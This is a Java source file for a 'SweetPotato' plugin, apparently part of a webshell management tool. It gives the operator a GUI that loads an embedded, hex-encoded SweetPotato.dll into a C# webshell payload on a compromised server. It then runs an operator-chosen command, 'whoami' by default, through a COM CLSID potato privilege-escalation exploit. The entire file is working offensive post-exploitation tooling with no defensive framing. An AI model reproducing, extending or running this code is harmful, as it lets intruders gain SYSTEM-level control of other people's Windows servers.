package vip.youwe.shell.shells.plugins.csharp;


import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.RTextArea;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "CShapDynamicPayload", Name = "SweetPotato")
public class SweetPotato implements Plugin {

    private static final String CLASS_NAME = "SweetPotato.Run";
    private JPanel panel;
    private JButton loadButton;
    private JButton runButton;
    private JTextField commandTextField;
    private JTextField clsidtTextField;
    private JSplitPane splitPane;
    private RTextArea resultTextArea;
    private JLabel clsidLabel;
    private JLabel commandLabel;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public SweetPotato() {
        this.panel = new JPanel(new BorderLayout());
        this.loadButton = new JButton("Load");
        this.runButton = new JButton("Run");
        this.commandTextField = new JTextField(35);
        this.clsidtTextField = new JTextField("4991D34B-80A1-4291-83B6-3328366B9097");
        this.resultTextArea = new RTextArea();
        this.clsidLabel = new JLabel("clsid :");
        this.commandLabel = new JLabel("command :");
        this.splitPane = new JSplitPane();

        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.clsidLabel);
        topPanel.add(this.clsidtTextField);
        topPanel.add(this.commandLabel);
        topPanel.add(this.commandTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                SweetPotato.this.splitPane.setDividerLocation(0.15D);
            }
        });
        this.panel.add(this.splitPane);
        this.commandTextField.setText("whoami");
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/SweetPotato.dll");
                byte[] data = functions.readInputStream(inputStream);
                data = functions.hexToByte(new String(data));
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
                }
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmd", this.commandTextField.getText());
        parameter.add("clsid", this.clsidtTextField.getText().trim().getBytes());
        byte[] result = this.payload.evalFunc(CLASS_NAME, "run", parameter);
        this.resultTextArea.setText(this.encoding.Decoding(result));
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

}
